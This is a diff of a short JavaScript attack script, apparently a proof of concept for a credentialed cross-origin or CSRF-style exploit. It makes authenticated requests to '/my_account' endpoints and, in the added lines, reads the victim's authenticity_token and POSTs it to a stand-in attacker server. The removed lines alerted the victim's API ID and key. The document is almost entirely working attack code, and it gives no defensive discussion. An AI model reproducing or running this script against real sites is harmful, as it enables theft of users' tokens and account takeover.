@@ -1,24 +1,27 @@
 var req1 = new XMLHttpRequest();
-req1.onload = req1Listener;
-req1.open('get', '/my_account/api_details', true);
-req1.withCredentials = true;
-req1.send('{}');
-function req1Listener() {
-document.write(this.responseText);
-};
+    req1.onload = req1Listener;
+    req1.open('get', '/my_account/users', true);
+    req1.withCredentials = true;
+    req1.send('{}');
+        function req1Listener() {
+        document.write(this.responseText);
+        };
         
-req1.onreadystatechange = function()
-{
-  if (req1.readyState == 4 && req1.status == 200)
-  {
-     var req2 = new XMLHttpRequest();
-     req2.onload = handleResponse;
-     req2.open('get','/my_account/api_details',true);
-     req2.send();
-     function handleResponse() {
-     var api_ID = document.getElementsByTagName("span").api_id.firstChild.data
-     var api_Key = document.getElementsByTagName("span").api_key.firstChild.data
-     alert('api_ID = ' + api_ID + '\n' + 'api_Key =' + api_Key);
+        req1.onreadystatechange = function()
+        {
+            if (req1.readyState == 4 && req1.status == 200)
+            {
+                var req2 = new XMLHttpRequest();
+                    req2.onload = handleResponse;
+                    req2.open('get','/my_account/api_details',true);
+                    req2.send();
+                    function handleResponse() {
+                        var authenticity_token = document.getElementsByTagName("input")['authenticity_token'].value;
+                        alert('authenticity_token = ' + authenticity_token);
+                        var stealInfo = new XMLHttpRequest();
+        // This sends victim's CSRF token(or authenticity_token) to attackers server
+                        stealInfo.open('post', 'https://attackers.example.domain', true);
+                        stealInfo.send('authenticity_token = ' + authenticity_token)
                 };
             }
         }
